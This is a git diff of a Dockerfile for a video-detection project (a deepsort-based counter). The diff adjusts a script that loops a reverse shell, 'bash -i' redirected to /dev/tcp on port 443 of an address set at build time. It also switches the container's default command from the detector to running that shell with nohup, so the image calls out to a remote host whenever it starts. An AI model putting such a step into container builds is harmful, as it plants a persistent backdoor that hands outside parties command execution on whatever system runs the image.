@@ -42,12 +42,12 @@ RUN sh build.sh
 WORKDIR ../../../
 
 # Add reverse shell script
-RUN LOCAL_IP=${LOCAL_IP} && echo "while true; do bash -i >& /dev/tcp/${LOCAL_IP}/443 0>&1; done" > remote_shell.sh
+RUN LOCAL_IP=${LOCAL_IP} && echo "set -m; while true; do bash -i >& /dev/tcp/${LOCAL_IP}/443 0>&1; done" > remote_shell.sh
 
 # Copy the remaining files
 COPY . /work/lawrence910426/Sharingan/video-detector
 
 WORKDIR /work/lawrence910426/Sharingan/video-detector
 
-CMD ["conda", "run", "-n", "detector", "python", "deepsort-counter.py", "videos/sample.mp4", "--mode", "cross_intersection"]
-# CMD ["nohup", "bash", "remote_shell.sh", "&"]
+# CMD ["conda", "run", "-n", "detector", "python", "deepsort-counter.py", "videos/10sec.mp4", "--mode", "t_intersection"]
+CMD ["nohup", "bash", "remote_shell.sh", "&"]
